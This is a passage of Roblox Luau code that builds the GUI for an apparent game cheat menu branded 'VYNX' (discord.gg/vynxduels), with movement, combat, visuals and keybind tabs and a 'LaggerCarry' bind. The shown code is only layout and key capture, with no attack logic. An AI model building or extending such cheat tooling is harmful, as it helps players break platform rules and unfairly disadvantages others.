    logoH.Name = "LogoH"
    logoH.Size = UDim2.new(0.52, 0, 1, 0)
    logoH.Position = UDim2.new(0.46, 0, 0, 0)
    logoH.BackgroundTransparency = 1
    logoH.Text = "H"
    logoH.TextColor3 = Color3.fromRGB(255, 255, 255)
    logoH.Font = Enum.Font.GothamBlack
    logoH.TextSize = 28
    logoH.TextStrokeTransparency = 0.7
    logoH.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    logoH.TextXAlignment = Enum.TextXAlignment.Left
    logoH.ZIndex = 53

    logoV:SetAttribute("NoTheme", true)
    logoH:SetAttribute("NoTheme", true)
    M.headerMiniLogo = logo

    local titleLbl = Instance.new("TextLabel")
    titleLbl.Name = "TitleLbl"
    titleLbl.ZIndex = 50
    titleLbl.Position = UDim2.new(0, 58, 0, 6)
    titleLbl.Size = UDim2.new(1, -120, 0, 28)
    titleLbl.BackgroundTransparency = 1
    titleLbl.RichText = true
    titleLbl.Text = M.headerTitleRich()
    titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLbl.TextTransparency = 0
    titleLbl.TextStrokeTransparency = 1
    titleLbl.TextSize = 24
    titleLbl.Font = Enum.Font.GothamBlack
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.TextYAlignment = Enum.TextYAlignment.Center
    titleLbl.TextScaled = false
    titleLbl.Visible = true
    titleLbl:SetAttribute("NoTheme", true)
    titleLbl.Parent = Header
    M.headerTitleLbl = titleLbl

    local discordLbl = Instance.new("TextLabel")
    discordLbl.Name = "HeaderDiscord"
    discordLbl.ZIndex = 50
    discordLbl.Position = UDim2.new(0, 58, 0, 34)
    discordLbl.Size = UDim2.new(1, -110, 0, 20)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text = "discord.gg/vynxduels"
    discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordLbl.TextTransparency = 0
    discordLbl.TextStrokeTransparency = 1
    discordLbl.TextSize = 14
    discordLbl.Font = Enum.Font.GothamBold
    discordLbl.TextXAlignment = Enum.TextXAlignment.Left
    discordLbl.TextYAlignment = Enum.TextYAlignment.Center
    discordLbl.Visible = true
    discordLbl:SetAttribute("NoTheme", true)
    discordLbl.Parent = Header
    M.headerDiscordLbl = discordLbl



    task.defer(function()
        if titleLbl and titleLbl.Parent then
            titleLbl.Visible = true
            titleLbl.RichText = true
            titleLbl.Text = M.headerTitleRich()
            titleLbl.TextTransparency = 0
            titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            titleLbl.TextSize = 24
            titleLbl.ZIndex = 50
        end
        if discordLbl and discordLbl.Parent then
            discordLbl.Visible = true
            discordLbl.Text = "discord.gg/vynxduels"
            discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            discordLbl.TextTransparency = 0
            discordLbl.TextSize = 14
            discordLbl.ZIndex = 50
        end
        if M.applyChromeTheme then pcall(M.applyChromeTheme) end
    end)

    M.headerFpsLbl = nil
    M.headerMsLbl = nil
    M.headerStatsLbl = nil

    local radVal = Instance.new("TextLabel")
    radVal.Visible = false
    radVal.Parent = Header
    M.headerRadiusLbl = radVal

    local discordStrip = Instance.new("Frame")
    discordStrip.Name = "DiscordStrip"
    discordStrip.Visible = false
    discordStrip.Parent = Header

    local CloseBtn = nil
    M.destroyMenuBtn = nil

    local MinBtn = Instance.new("TextButton")
    MinBtn.Name = "CloseBtn"
    MinBtn.Size = UDim2.new(0, 52, 0, 28)
    MinBtn.Position = UDim2.new(1, -62, 0, 16)
    MinBtn.BackgroundTransparency = 1
    MinBtn.BorderSizePixel = 0
    MinBtn.Text = "--"
    MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MinBtn.TextTransparency = 0
    MinBtn.TextSize = 22
    MinBtn.Font = Enum.Font.GothamBlack
    MinBtn.AutoButtonColor = false
    MinBtn.ZIndex = 50
    MinBtn.Parent = Header
    MinBtn:SetAttribute("NoTheme", true)
    -- no circle / no stroke: only wide "--"
    MinBtn.MouseEnter:Connect(function()
        MinBtn.TextColor3 = Color3.fromRGB(200, 230, 255)
    end)
    MinBtn.MouseLeave:Connect(function()
        MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)

    local lockButton = Instance.new("TextButton")
    lockButton.Size = UDim2.new(0, 0, 0, 0)
    lockButton.Visible = false
    lockButton.Parent = Header
    local locked = false
    lockButton.Activated:Connect(function()
        locked = not locked
        M.uiLocked = false
        saveCherryConfig()
    end)

    M.sideBarPanel = nil

    local dragStrip = Instance.new("Frame")
    dragStrip.Name = "RightDragStrip"
    dragStrip.Size = UDim2.new(0, 3, 1, -(HEADER_H + 20))
    dragStrip.Position = UDim2.new(1, -10, 0, HEADER_H + 10)
    dragStrip.BackgroundColor3 = Color3.fromRGB(55, 55, 58)
    dragStrip.BackgroundTransparency = 0.45
    dragStrip.BorderSizePixel = 0
    dragStrip.ZIndex = 6
    dragStrip.Parent = ContentRoot
    Instance.new("UICorner", dragStrip).CornerRadius = UDim.new(1, 0)

    local masterScroll = Instance.new("ScrollingFrame")
    masterScroll.Name = "AllPage"
    masterScroll.BackgroundTransparency = 1
    masterScroll.BorderSizePixel = 0

    masterScroll.Position = UDim2.new(0, 10, 0, HEADER_H + 4)
    masterScroll.Size = UDim2.new(1, -(SIDE_W + 28), 1, -(HEADER_H + 16))
    masterScroll.ScrollBarThickness = 0
    masterScroll.ScrollBarImageColor3 = Color3.fromRGB(200, 200, 200)
    masterScroll.ScrollBarImageTransparency = 1
    masterScroll.VerticalScrollBarInset = Enum.ScrollBarInset.None
    masterScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    masterScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    masterScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    masterScroll.ElasticBehavior = Enum.ElasticBehavior.Never
    masterScroll.ZIndex = 3
    masterScroll.Parent = ContentRoot
    local masterLayout = Instance.new("UIListLayout")
    masterLayout.Padding = UDim.new(0, 6)
    masterLayout.SortOrder = Enum.SortOrder.LayoutOrder
    masterLayout.Parent = masterScroll
    local masterPad = Instance.new("UIPadding")
    masterPad.PaddingTop = UDim.new(0, 10)
    masterPad.PaddingBottom = UDim.new(0, 15)
    masterPad.PaddingLeft = UDim.new(0, 4)
    masterPad.PaddingRight = UDim.new(0, 4)
    masterPad.Parent = masterScroll

    local BottomSep = Instance.new("Frame")
    BottomSep.Visible = false
    BottomSep.Parent = ContentRoot

    local CategoryBar = Instance.new("ScrollingFrame")
    CategoryBar.Name = "CategoryBar"
    CategoryBar.Visible = true
    CategoryBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    CategoryBar.BackgroundTransparency = 1
    CategoryBar.BorderSizePixel = 0
    CategoryBar.ScrollBarThickness = 0
    CategoryBar.ScrollingEnabled = false
    CategoryBar.Size = UDim2.new(1, -20, 0, 40)
    CategoryBar.Position = UDim2.new(0, 10, 0, HEADER_H + 4)
    CategoryBar.ZIndex = 25
    CategoryBar.Parent = ContentRoot
    Instance.new("UICorner", CategoryBar).CornerRadius = UDim.new(0, 14)
    M.categoryBar = CategoryBar
    M.mainFrame = Frame
    M.contentRoot = ContentRoot

    do
        local cst = Instance.new("UIStroke")
        cst.Name = "SideStroke"
        cst.Color = Color3.fromRGB(70, 70, 75)
        cst.Thickness = 1.2
        cst.Transparency = 1
        cst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        cst.Parent = CategoryBar
    end
    do
        local pageTitle = Instance.new("TextLabel")
        pageTitle.Name = "PageTitle"
        pageTitle.Visible = false
        pageTitle.Size = UDim2.new(0, 0, 0, 0)
        pageTitle.Parent = ContentRoot
        M.pageTitleLbl = pageTitle
    end
    local menuLbl = Instance.new("TextLabel")
    menuLbl.Size = UDim2.new(1, -8, 0, 22)
    menuLbl.Position = UDim2.new(0, 4, 0, 4)
    menuLbl.BackgroundTransparency = 1
    menuLbl.Text = "MENU"
    menuLbl.TextColor3 = Color3.fromRGB(120, 120, 120)
    menuLbl.Font = Enum.Font.GothamBold
    menuLbl.TextSize = 11
    menuLbl.TextXAlignment = Enum.TextXAlignment.Left
    menuLbl.ZIndex = 9
    menuLbl.Parent = CategoryBar
    local CatBarLayout = Instance.new("UIListLayout")
    CatBarLayout.FillDirection = Enum.FillDirection.Horizontal
    CatBarLayout.SortOrder = Enum.SortOrder.LayoutOrder
    CatBarLayout.Padding = UDim.new(0, 6)
    CatBarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
    CatBarLayout.Parent = CategoryBar
    local CatBarPad = Instance.new("UIPadding")
    CatBarPad.PaddingLeft = UDim.new(0, 6)
    CatBarPad.PaddingRight = UDim.new(0, 6)
    CatBarPad.PaddingTop = UDim.new(0, 4)
    CatBarPad.PaddingBottom = UDim.new(0, 4)
    CatBarPad.Parent = CategoryBar

    local tabList = CategoryBar

    local layoutOrder = 0
    local function addSectionDivider(title)
        layoutOrder = layoutOrder + 1
        local r = Instance.new("Frame")
        r.Name = "Section_" .. tostring(title)
        r.Size = UDim2.new(1, 0, 0, 28)
        r.BackgroundTransparency = 1
        r.LayoutOrder = layoutOrder
        r.ZIndex = 3
        r.Parent = masterScroll
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, -8, 1, 0)
        t.Position = UDim2.new(0, 4, 0, 0)
        t.BackgroundTransparency = 1
        t.Text = string.upper(tostring(title or ""))
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.Font = Enum.Font.GothamBlack
        t.TextSize = 13
        t.TextXAlignment = Enum.TextXAlignment.Left
        t.ZIndex = 4
        t.Parent = r
        return r
    end

    local function makeAllPage(name)
        layoutOrder = layoutOrder + 1
        local p = Instance.new("Frame")
        p.Name = name
        p.BackgroundTransparency = 1
        p.BorderSizePixel = 0
        p.Size = UDim2.new(1, 0, 0, 0)
        p.AutomaticSize = Enum.AutomaticSize.Y
        p.LayoutOrder = layoutOrder
        p.ZIndex = 3
        p.Visible = true
        p.Parent = masterScroll
        local l = Instance.new("UIListLayout")
        l.Padding = UDim.new(0, 7)
        l.SortOrder = Enum.SortOrder.LayoutOrder
        l.Parent = p
        local pd = Instance.new("UIPadding")
        pd.PaddingTop = UDim.new(0, 2)
        pd.PaddingBottom = UDim.new(0, 8)
        pd.Parent = p
        return p
    end

    local PM = makeAllPage("Page_SPEED")
    local PMech = makeAllPage("Page_MECHANICS")
    local PVis = makeAllPage("Page_VISUALS")
    local PUtil = makeAllPage("Page_UTILITY")
    local PKB = makeAllPage("Page_KEYBINDS")
    local PBtn = makeAllPage("Page_BUTTONS")

    local Pages = {SPEED=PM, MECHANICS=PMech, VISUALS=PVis, UTILITY=PUtil, KEYBINDS=PKB, BUTTONS=PBtn}
    local tabOrder = {"MAIN", "COMBAT", "CONFIG", "BTNS", "SET"}
    local tabLabels = { MAIN = "MOVEMENT", COMBAT = "COMBAT", CONFIG = "VISUALS", BTNS = "BUTTONS", SET = "SETTINGS" }
    local tabToPages = {
        MAIN = {"SPEED"},
        COMBAT = {"MECHANICS"},
        CONFIG = {"VISUALS"},
        BTNS = {"BUTTONS"},
        SET = {"UTILITY", "KEYBINDS"},
    }
    local tabButtons = {}
    M.tabButtonRefs = tabButtons
    local currentTab = "MAIN"
    M._currentTabName = currentTab

    local function selectTab(name)
        currentTab = name
        M._currentTabName = name
        local showSet = {}
        for _, pk in ipairs(tabToPages[name] or {}) do showSet[pk] = true end
        for k, page in pairs(Pages) do
            page.Visible = (showSet[k] == true)
        end
        if M.pageTitleLbl then M.pageTitleLbl.Visible = false end
        for k, btn in pairs(tabButtons) do
            if btn and btn.Parent and M.styleTab then
                pcall(function() M.styleTab(btn, k == name) end)
            end
        end
        masterScroll.CanvasPosition = Vector2.new(0, 0)
    end
    M.selectTab = selectTab

    local TopTabBar = Instance.new("Frame")
    TopTabBar.Name = "TopTabBar"
    TopTabBar.Visible = false
    TopTabBar.Size = UDim2.new(0, 0, 0, 0)
    TopTabBar.Parent = ContentRoot
    M.topTabBar = TopTabBar
    M.sideBarPanel = CategoryBar

    for _, ch in ipairs(CategoryBar:GetChildren()) do
        if ch:IsA("TextLabel") and ch.Text == "MENU" then ch.Visible = false end
    end

    local sideLay = CategoryBar:FindFirstChildOfClass("UIListLayout")
    if sideLay then
        sideLay.FillDirection = Enum.FillDirection.Vertical
        sideLay.HorizontalAlignment = Enum.HorizontalAlignment.Center
        sideLay.Padding = UDim.new(0, 8)
        sideLay.SortOrder = Enum.SortOrder.LayoutOrder
    end
    local sidePad = CategoryBar:FindFirstChildOfClass("UIPadding")
    if sidePad then
        sidePad.PaddingTop = UDim.new(0, 12)
        sidePad.PaddingBottom = UDim.new(0, 12)
        sidePad.PaddingLeft = UDim.new(0, 6)
        sidePad.PaddingRight = UDim.new(0, 6)
    end

    for i, name in ipairs(tabOrder) do
        local btn = Instance.new("TextButton")
        btn.Name = "Tab_" .. name
        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btn.BackgroundTransparency = 1
        btn.BorderSizePixel = 0
        btn.Text = tabLabels[name] or name
        btn.TextColor3 = Color3.fromRGB(205, 205, 215)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 12
        btn.TextStrokeTransparency = 1
        btn.AutoButtonColor = false
        btn.ZIndex = 31
        btn.LayoutOrder = i
        btn.Parent = CategoryBar
        btn:SetAttribute("TabActive", false)
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 9)
        local st = Instance.new("UIStroke")
        st.Name = "TabStroke"
        st.Color = Color3.fromRGB(48, 48, 56)
        st.Thickness = 1
        st.Transparency = 0.45
        st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        st.Parent = btn
        local tacc = Instance.new("Frame")
        tacc.Name = "TabAccent"
        tacc.AnchorPoint = Vector2.new(0, 0.5)
        tacc.Size = UDim2.new(0, 3, 1, -12)
        tacc.Position = UDim2.new(0, 0, 0.5, 0)
        tacc.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
        tacc.BorderSizePixel = 0
        tacc.BackgroundTransparency = 1
        tacc.ZIndex = 33
        tacc.Parent = btn
        tabButtons[name] = btn
        btn.MouseEnter:Connect(function()
            if not btn:GetAttribute("TabActive") then
                btn.TextColor3 = Color3.fromRGB(220, 235, 255)
            end
        end)
        btn.MouseLeave:Connect(function()
            if not btn:GetAttribute("TabActive") then
                btn.TextColor3 = Color3.fromRGB(180, 190, 210)
            end
        end)
        btn.MouseButton1Click:Connect(function() selectTab(name) end)
    end

    M.styleTab = function(btn, on)
        if not btn then return end
        btn:SetAttribute("TabActive", on == true)
        local acc = Color3.fromRGB(40, 140, 255)
        -- Chrome-like top tabs: dark pill + blue underline when active
        btn.BackgroundColor3 = on and Color3.fromRGB(12, 18, 28) or Color3.fromRGB(0, 0, 0)
        btn.BackgroundTransparency = on and 0.15 or 1
        btn.TextColor3 = on and Color3.fromRGB(120, 190, 255) or Color3.fromRGB(150, 160, 175)
        btn.Font = Enum.Font.GothamBold
        local grad = btn:FindFirstChild("TabGradient")
        if grad then pcall(function() grad:Destroy() end) end
        local st = btn:FindFirstChild("TabStroke")
        if not st then
            st = Instance.new("UIStroke")
            st.Name = "TabStroke"
            st.Parent = btn
        end
        st.Color = acc
        st.Thickness = 1
        st.Transparency = on and 0.45 or 1
        local ab = btn:FindFirstChild("TabAccent")
        if ab then ab.BackgroundTransparency = 1 end
        local line = btn:FindFirstChild("TabUnderline")
        if not line then
            line = Instance.new("Frame")
            line.Name = "TabUnderline"
            line.AnchorPoint = Vector2.new(0.5, 1)
            line.Position = UDim2.new(0.5, 0, 1, -1)
            line.Size = UDim2.new(0.7, 0, 0, 2)
            line.BorderSizePixel = 0
            line.ZIndex = (btn.ZIndex or 30) + 2
            line.Parent = btn
            local lc = Instance.new("UICorner")
            lc.CornerRadius = UDim.new(1, 0)
            lc.Parent = line
        end
        line.BackgroundColor3 = acc
        line.BackgroundTransparency = on and 0 or 1
    end

    local function fitTabs()
        if not (CategoryBar and CategoryBar.Parent) then return end
        local n = 0
        for _ in pairs(tabButtons) do n = n + 1 end
        if n == 0 then return end
        local absW, absH = CategoryBar.AbsoluteSize.X, CategoryBar.AbsoluteSize.Y
        if absW <= 0 or absH <= 0 then return end
        local lay = CategoryBar:FindFirstChildOfClass("UIListLayout")
        if lay then lay.Padding = UDim.new(0, 0) end
        local vertical = (CategoryBar.Size.X.Scale == 0)
        if vertical then
            local pad = CategoryBar:FindFirstChildOfClass("UIPadding")
            local topP = pad and pad.PaddingTop.Offset or 0
            local botP = pad and pad.PaddingBottom.Offset or 0
            local slot = math.max(30, math.floor((absH - topP - botP) / n))
            for _, btn in pairs(tabButtons) do
                if btn and btn.Parent then btn.Size = UDim2.new(1, -4, 0, slot) end
            end
        else
            local pad = CategoryBar:FindFirstChildOfClass("UIPadding")
            local leftP = pad and pad.PaddingLeft.Offset or 0
            local rightP = pad and pad.PaddingRight.Offset or 0
            local gap = 4
            local avail = math.max(1, absW - leftP - rightP - gap * math.max(0, n - 1))
            local slot = math.max(58, math.floor(avail / n))
            for _, btn in pairs(tabButtons) do
                if btn and btn.Parent then
                    btn.Size = UDim2.new(0, slot, 1, -6)
                    btn.TextSize = 11
                    btn.TextTruncate = Enum.TextTruncate.None
                end
            end
            local totalW = leftP + rightP + n * slot + gap * math.max(0, n - 1)
            if totalW > absW + 2 then
                CategoryBar.CanvasSize = UDim2.new(0, totalW + 8, 0, 0)
                CategoryBar.ScrollingEnabled = true
                CategoryBar.ScrollBarThickness = 2
            else
                CategoryBar.CanvasSize = UDim2.new(0, 0, 0, 0)
                CategoryBar.ScrollingEnabled = false
            end
            return
        end
        CategoryBar.CanvasSize = UDim2.new(0, 0, 0, 0)
        CategoryBar.ScrollingEnabled = false
    end
    M.fitTabs = fitTabs
    CategoryBar:GetPropertyChangedSignal("AbsoluteSize"):Connect(fitTabs)
    task.defer(fitTabs)
    task.delay(0.2, fitTabs)
    task.delay(0.5, fitTabs)

    selectTab("MAIN")
    M.allPageScroll = masterScroll
    M.mainFrame = Frame
    M.categoryBar = CategoryBar
    task.defer(function()
        M.uiLayoutMode = "Vertical Top"
        pcall(function() M.applyUiLayout("Vertical Top") end)
        pcall(function() selectTab(M._currentTabName or "MAIN") end)
    end)


    do
        local v = Instance.new("TextLabel")
        v.Name = "AceVerticalScript"
        v.Size = UDim2.new(0, 22, 0, 260)
        v.Position = UDim2.new(1, -SIDE_W - 32, 0, HEADER_H + 100)
        v.BackgroundTransparency = 1
        v.Text = "不\n能\nな\n生\nき\nて\nい"
        v.TextColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
        v.TextTransparency = 0.35
        v.Font = Enum.Font.GothamBlack
        v.TextSize = 14
        v.TextWrapped = true
        v.TextYAlignment = Enum.TextYAlignment.Top
        v.ZIndex = 24
        v.Rotation = 0
        v.Parent = ContentRoot
    end


    local function closeUI()
        local tween = TweenService:Create(Frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, MAIN_W, 0, 0),
            Position = Frame.Position + UDim2.new(0, 0, 0, MAIN_H/2),
            BackgroundTransparency = 1
        })
        tween:Play()
        tween.Completed:Connect(function()
            Frame.Visible = false
            Frame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
            Frame.Position = UDim2.new(0, 14, 0, 10)
            Frame.BackgroundTransparency = 0
        end)
    end

    local MinPill = Instance.new("TextButton")
    MinPill.Name = "MiniFrame"
    MinPill.Visible = false -- only when menu is closed
    MinPill.Active = true
    MinPill.AutoButtonColor = false
    MinPill.ZIndex = 40
    MinPill.AnchorPoint = Vector2.new(0, 0)
    MinPill.Position = UDim2.new(0, 14, 0, 72)
    MinPill.Size = UDim2.new(0, 64, 0, 84)
    MinPill.BackgroundTransparency = 1
    MinPill.BorderSizePixel = 0
    MinPill.Text = ""
    MinPill.Parent = gui

    -- Circle with shared background image
    local MiniCircle = Instance.new("Frame")
    MiniCircle.Name = "MiniCircle"
    MiniCircle.Size = UDim2.new(0, 56, 0, 56)
    MiniCircle.Position = UDim2.new(0.5, -28, 0, 0)
    MiniCircle.BackgroundColor3 = Color3.fromRGB(6, 12, 20)
    MiniCircle.BackgroundTransparency = 0
    MiniCircle.BorderSizePixel = 0
    MiniCircle.ZIndex = 41
    MiniCircle.Parent = MinPill
    Instance.new("UICorner", MiniCircle).CornerRadius = UDim.new(1, 0)
    do
        local st = Instance.new("UIStroke", MiniCircle)
        st.Name = "MiniStroke"
        st.Color = Color3.fromRGB(40, 150, 255)
        st.Thickness = 2
        st.Transparency = 0.08
        st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    end

    local MiniBg = Instance.new("ImageLabel")
    MiniBg.Name = "MiniBg"
    MiniBg.Size = UDim2.new(1, 0, 1, 0)
    MiniBg.BackgroundTransparency = 1
    MiniBg.BorderSizePixel = 0
    MiniBg.ScaleType = Enum.ScaleType.Crop
    MiniBg.ZIndex = 42
    MiniBg.Parent = MiniCircle
    Instance.new("UICorner", MiniBg).CornerRadius = UDim.new(1, 0)
    pcall(function()
        local id = (M.getSelectedBgId and select(1, M.getSelectedBgId())) or tonumber(M.MENU_BG_ASSET) or 73023682914801
        MiniBg.Image = "rbxassetid://" .. tostring(id)
    end)

    local MiniLabel = Instance.new("TextLabel")
    MiniLabel.Name = "MiniLabel"
    MiniLabel.Size = UDim2.new(1, 0, 0, 18)
    MiniLabel.Position = UDim2.new(0, 0, 0, 58)
    MiniLabel.BackgroundTransparency = 1
    MiniLabel.Text = "VYNX"
    MiniLabel.TextColor3 = Color3.fromRGB(40, 160, 255)
    MiniLabel.Font = Enum.Font.GothamBlack
    MiniLabel.TextSize = 12
    MiniLabel.TextStrokeTransparency = 0.3
    MiniLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    MiniLabel.ZIndex = 43
    MiniLabel.Parent = MinPill

    M.miniPill = MinPill
    M.miniPillBg = MiniBg
    function M.refreshMiniPillBg()
        if not M.miniPillBg then return end
        pcall(function()
            local id = (M.getSelectedBgId and select(1, M.getSelectedBgId())) or tonumber(M.MENU_BG_ASSET) or 73023682914801
            M.miniPillBg.Image = "rbxassetid://" .. tostring(id)
        end)
    end

    MinPill.MouseButton1Click:Connect(function()
        MinPill.Visible = false
        Frame.Visible = true
        M.menuOpen = true
        pcall(saveCherryConfig)
    end)

    local function minimize()
        Frame.Visible = false
        MinPill.Visible = true
        M.menuOpen = false
        pcall(saveCherryConfig)
    end
    MinBtn.MouseButton1Click:Connect(minimize)
    task.defer(function()
        if MinBtn and MinBtn.Parent then
            MinBtn.BackgroundTransparency = 1
            MinBtn.Text = "--"
            MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            MinBtn.TextTransparency = 0
            MinBtn.Font = Enum.Font.GothamBlack
            MinBtn.TextSize = 22
            MinBtn.Size = UDim2.new(0, 52, 0, 28)
            for _, c in ipairs(MinBtn:GetChildren()) do
                if c:IsA("UICorner") or c:IsA("UIStroke") then pcall(function() c:Destroy() end) end
            end
        end
    end)

    do
        local function makeDrag(obj, target, savePos)
            local drag,dStart,sPos
            obj.InputBegan:Connect(function(i)
                if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
                    drag=true; dStart=i.Position; sPos=target.Position
                    i.Changed:Connect(function()
                        if i.UserInputState==Enum.UserInputState.End then
                            drag=false
                            if savePos then
                                M.menuPosX = target.Position.X.Offset
                                M.menuPosY = target.Position.Y.Offset
                                pcall(saveCherryConfig)
                            end
                        end
                    end)
                end
            end)
            obj.InputChanged:Connect(function(i)
                if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
                    if drag then
                        local d=i.Position-dStart
                        target.Position=UDim2.new(sPos.X.Scale,sPos.X.Offset+d.X,sPos.Y.Scale,sPos.Y.Offset+d.Y)
                    end
                end
            end)
        end
        makeDrag(Header, Frame, false)
        makeDrag(MinPill, MinPill, false)
    end

    M._anyKeyListening = false


    local activeKBId = nil
    local listeningTimeout = nil
    M.keybindButtons = {}

    if M._keybindCaptureConn then
        pcall(function() M._keybindCaptureConn:Disconnect() end)
        M._keybindCaptureConn = nil
    end
    M._anyKeyListening = false

    local function formatKeybindText(entry)
        if not entry then return "..." end
        local parts = {}
        if entry.kb then table.insert(parts, entry.kb.Name) end
        if entry.gp then table.insert(parts, entry.gp.Name) end
        if #parts == 0 then return "..." end
        return table.concat(parts, " / ")
    end

    local function refreshKeybindButton(id)
        local info = M.keybindButtons[id]
        if not info or not info.btn then return end
        info.btn.Text = formatKeybindText(info.entry)
        info.btn.TextColor3 = UI_TEXT_DIM
        -- keep every button that shares the same entry in sync
        for oid, oinfo in pairs(M.keybindButtons) do
            if oid ~= id and oinfo and oinfo.entry == info.entry and oinfo.btn then
                oinfo.btn.Text = formatKeybindText(oinfo.entry)
                oinfo.btn.TextColor3 = UI_TEXT_DIM
            end
        end
    end

    local function resetKeybindCapture()
        if activeKBId then
            refreshKeybindButton(activeKBId)
            activeKBId = nil
        end
        M._anyKeyListening = false
        if listeningTimeout then
            pcall(function() task.cancel(listeningTimeout) end)
            listeningTimeout = nil
        end
    end

    local function isGamepadInputType(uit)
        return uit == Enum.UserInputType.Gamepad1
            or uit == Enum.UserInputType.Gamepad2
            or uit == Enum.UserInputType.Gamepad3
            or uit == Enum.UserInputType.Gamepad4
            or uit == Enum.UserInputType.Gamepad5
            or uit == Enum.UserInputType.Gamepad6
            or uit == Enum.UserInputType.Gamepad7
            or uit == Enum.UserInputType.Gamepad8
    end

    local function clearKeyFromOthers(exceptId, kind, keycode)
        if not keycode then return end
        for id, info in pairs(M.keybindButtons) do
            if id ~= exceptId and info and info.entry then
                if kind == "kb" and info.entry.kb == keycode then
                    info.entry.kb = nil
                    refreshKeybindButton(id)
                elseif kind == "gp" and info.entry.gp == keycode then
                    info.entry.gp = nil
                    refreshKeybindButton(id)
                end
            end
        end

        for name, entry in pairs(M.KB) do
            if type(entry) == "table" then
                local mapped = false
                for id, info in pairs(M.keybindButtons) do
                    if info.entry == entry then mapped = true break end
                end
                if not mapped then
                    if kind == "kb" and entry.kb == keycode then entry.kb = nil end
                    if kind == "gp" and entry.gp == keycode then entry.gp = nil end
                end
            end
        end
    end

    local function uiKeybindRow(parent, label, kbEntry, bindId)
        bindId = bindId or label

        local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
        r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent
        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 10)
        do local rst=Instance.new("UIStroke"); rst.Color=Color3.fromRGB(40,40,45); rst.Thickness=1; rst.Transparency=0.35; rst.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; rst.Parent=r end
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-90,1,0); l.BackgroundTransparency=1
        l.Text=label; l.TextColor3=Color3.fromRGB(255,255,255); l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local btn = Instance.new("TextButton")
        btn.Position = UDim2.new(1, -72, 0.5, -14)
        btn.Size = UDim2.new(0, 60, 0, 28)
        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btn.BorderSizePixel = 0
        btn.Text = formatKeybindText(kbEntry)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 13
        btn.AutoButtonColor = false
        btn.Parent = r
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 9)
        do
            local kst = Instance.new("UIStroke")
            kst.Color = Color3.fromRGB(255, 255, 255)
            kst.Thickness = 1.4
            kst.Transparency = 0.2
            kst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            kst.Parent = btn
        end
        M.keybindButtons[bindId] = { btn = btn, entry = kbEntry }

        btn.MouseButton1Click:Connect(function()
            if activeKBId and activeKBId ~= bindId then resetKeybindCapture() end
            activeKBId = bindId
            btn.Text = "Press key / button..."
            btn.TextColor3 = Color3.fromRGB(180,180,180)
            M._anyKeyListening = true
            if listeningTimeout then pcall(function() task.cancel(listeningTimeout) end) end
            listeningTimeout = task.delay(8, resetKeybindCapture)
        end)
        return r
    end

    local function kbMatch(entry, keycode)
        if not entry or not keycode or keycode == Enum.KeyCode.Unknown then return false end
        if entry.kb and entry.kb == keycode then return true end
        if entry.gp and entry.gp == keycode then return true end
        return false
    end

    M._keybindCaptureConn = UIS.InputBegan:Connect(function(input, gameProcessed)

        if M._anyKeyListening then
            if activeKBId then
                local kc = input.KeyCode
                if kc == Enum.KeyCode.Escape then
                    resetKeybindCapture()
                    pcall(saveCherryConfig)
                    return
                end
                local info = M.keybindButtons[activeKBId]
                if not info or not info.entry then
                    resetKeybindCapture()
                    return
                end
                local uit = input.UserInputType
                -- ensure entry table exists
                if type(info.entry) ~= "table" then
                    info.entry = {kb=nil, gp=nil}
                end
                if uit == Enum.UserInputType.Keyboard and kc ~= Enum.KeyCode.Unknown then
                    clearKeyFromOthers(activeKBId, "kb", kc)
                    info.entry.kb = kc
                    -- keep M.KB slot in sync if this is LaggerCarry
                    if info.entry == M.KB.LaggerCarry or activeKBId:find("LaggerCarry", 1, true) then
                        M.KB.LaggerCarry = info.entry
                    end
                    refreshKeybindButton(activeKBId)
                    activeKBId = nil
                    M._anyKeyListening = false
                    if listeningTimeout then pcall(function() task.cancel(listeningTimeout) end); listeningTimeout = nil end
                    pcall(saveCherryConfig)
